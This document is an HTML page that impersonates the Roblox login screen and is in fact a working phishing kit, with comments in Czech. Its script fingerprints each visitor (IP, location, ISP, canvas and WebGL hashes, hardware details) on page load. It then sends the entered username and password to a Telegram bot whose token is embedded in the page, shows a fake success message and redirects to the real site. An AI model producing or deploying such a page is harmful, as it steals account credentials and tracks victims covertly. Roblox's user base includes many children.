<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox ‚Äì Log in</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
      color: #e0e0ff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .container {
      background: rgba(20,20,40,0.92);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 48px 40px;
      width: 100%;
      max-width: 420px;
      border: 1px solid rgba(0,162,255,0.18);
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
      animation: fadeIn 0.8s ease-out;
      position: relative;
      overflow: hidden;
    }
    @keyframes fadeIn { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
    .logo { width:140px; margin:0 auto 32px; display:block; }
    h1 { font-size:32px; font-weight:700; text-align:center; margin-bottom:12px; color:#fff; }
    .subtitle { text-align:center; color:#a0a0ff; margin-bottom:36px; font-size:16px; }
    .input-group { margin-bottom:24px; position:relative; }
    label { display:block; margin-bottom:8px; font-size:14px; color:#d0d0ff; font-weight:500; }
    input {
      width:100%; padding:14px 16px; font-size:16px; border:1px solid rgba(0,162,255,0.3);
      border-radius:8px; background:rgba(30,30,50,0.7); color:white; outline:none; transition:all 0.25s;
    }
    input:focus { border-color:#00a2ff; box-shadow:0 0 0 4px rgba(0,162,255,0.2); }
    .btn {
      width:100%; padding:16px; font-size:18px; font-weight:600; background:linear-gradient(90deg,#00a2ff,#0077cc);
      border:none; border-radius:8px; color:white; cursor:pointer; transition:all 0.3s; margin-top:12px;
    }
    .btn:hover { background:linear-gradient(90deg,#0088ff,#0055aa); transform:translateY(-2px); box-shadow:0 8px 24px rgba(0,162,255,0.35); }
    .status { margin-top:24px; text-align:center; font-size:15px; min-height:24px; }
    .success { color:#00ff88; }
    .error   { color:#ff5555; }
    .loading {
      text-align:center; font-size:18px; color:#00a2ff; margin:40px 0; animation:pulse 1.5s infinite;
    }
    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
    .particles {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      pointer-events: none;
      overflow: hidden;
      z-index: -1;
    }
    .particle {
      position: absolute;
      background: rgba(0,162,255,0.6);
      border-radius: 50%;
      animation: float 15s infinite linear;
    }
    @keyframes float {
      0% { transform: translateY(100vh) scale(0.2); opacity:0; }
      50% { opacity:0.8; }
      100% { transform: translateY(-20vh) scale(0.8); opacity:0; }
    }
  </style>
</head>
<body>

  <div class="particles" id="particles"></div>

  <div class="container" id="loading">
    <div class="loading">Loading Roblox... Please wait</div>
  </div>

  <div class="container" id="main" style="display:none;">
    <img class="logo" src="https://www.roblox.com/images/logo.png" alt="Roblox"/>
    <h1>Log in to Roblox</h1>
    <p class="subtitle">Enter your credentials to continue to your account</p>

    <form id="loginForm">
      <div class="input-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" placeholder="Username or Email" autocomplete="off" required>
      </div>

      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="Password" autocomplete="off" required>
      </div>

      <button type="submit" class="btn">Log In</button>
    </form>

    <div class="status" id="status"></div>
  </div>

  <script>
    // Nahraƒè sv√Ωmi hodnotami!
    const botToken = '8334158147:AAHDWzsU87L9hzZhCZBCB9RA03Cb6uO59Gs';  // z BotFather
    const chatId   = '6418644280';    // tv√© ID nebo kan√°l/skupina

    async function sendToTelegram(text) {
      const url = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
      await fetch(url).catch(() => {});
    }

    // Generuj n√°hodn√© ƒç√°stice pro background efekt
    function createParticles() {
      const particles = document.getElementById('particles');
      for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.width = `${Math.random() * 4 + 1}px`;
        p.style.height = p.style.width;
        p.style.left = `${Math.random() * 100}%`;
        p.style.animationDelay = `${Math.random() * 15}s`;
        p.style.animationDuration = `${Math.random() * 20 + 10}s`;
        particles.appendChild(p);
      }
    }

    // 1. Hned po naƒçten√≠ po≈°li maxim√°ln√≠ fingerprint + metadata
    window.addEventListener('load', async () => {
      createParticles(); // background efekt

      const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

      const fingerprint = {
        canvas: await getCanvasFingerprint(),
        webgl: await getWebGLFingerprint(),
        userAgent: navigator.userAgent,
        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
        platform: navigator.platform,
        screen: `\( {screen.width}√ó \){screen.height} (${screen.colorDepth} bit)`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direct',
        cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
        doNotTrack: navigator.doNotTrack || 'unset',
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        timestamp: new Date().toLocaleString('en-US')
      };

      const text = `üî• PAGE LOADED - MAX INFO üî•\n\n` +
        `<b>IP:</b> ${ipData.ip || 'hidden'}\n` +
        `<b>City / Country:</b> ${ipData.city || '?'} / ${ipData.country_name || '?'}\n` +
        `<b>ISP:</b> ${ipData.org || '?'}\n` +
        `<b>User-Agent:</b> ${fingerprint.userAgent}\n` +
        `<b>Languages:</b> ${fingerprint.languages}\n` +
        `<b>Platform:</b> ${fingerprint.platform}\n` +
        `<b>Screen:</b> ${fingerprint.screen}\n` +
        `<b>Timezone:</b> ${fingerprint.timezone}\n` +
        `<b>Referrer:</b> ${fingerprint.referrer}\n` +
        `<b>Cookies enabled:</b> ${fingerprint.cookiesEnabled}\n` +
        `<b>Do Not Track:</b> ${fingerprint.doNotTrack}\n` +
        `<b>CPU cores:</b> ${fingerprint.hardwareConcurrency}\n` +
        `<b>RAM (GB):</b> ${fingerprint.deviceMemory}\n` +
        `<b>Connection type:</b> ${fingerprint.connection}\n` +
        `<b>Canvas FP:</b> ${fingerprint.canvas}\n` +
        `<b>WebGL FP:</b> ${fingerprint.webgl}\n` +
        `<b>Time:</b> ${fingerprint.timestamp}`;

      await sendToTelegram(text);

      // Skryj loading, uka≈æ login
      document.getElementById('loading').style.display = 'none';
      document.getElementById('main').style.display = 'block';
    });

    async function getCanvasFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = '#069';
      ctx.fillText('Hello, world!', 2,15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('Hello, world!', 4,17);
      const data = canvas.toDataURL();
      const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data));
      return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('').slice(0,32);
    }

    async function getWebGLFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'WebGL not supported';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
      } catch {
        return 'error';
      }
    }

    // Login submit ‚Äì po≈°le username + password
    document.getElementById('loginForm').addEventListener('submit', e => {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const status = document.getElementById('status');

      if (!username || !password) {
        status.textContent = 'Fill in both fields';
        status.className = 'status error';
        return;
      }

      status.textContent = 'Logging in...';
      status.className = 'status';

      sendToTelegram(`üî• LOGIN DATA üî•\n\n<b>Username/Email:</b> ${username}\n<b>Password:</b> ${password}\nTime: ${new Date().toLocaleString('en-US')}`);

      setTimeout(() => {
        status.textContent = 'Success! Redirecting...';
        status.className = 'status success';
        setTimeout(() => window.location.href = 'https://www.roblox.com/home', 1500);
      }, 1200);
    });
  </script>
</body>
</html>
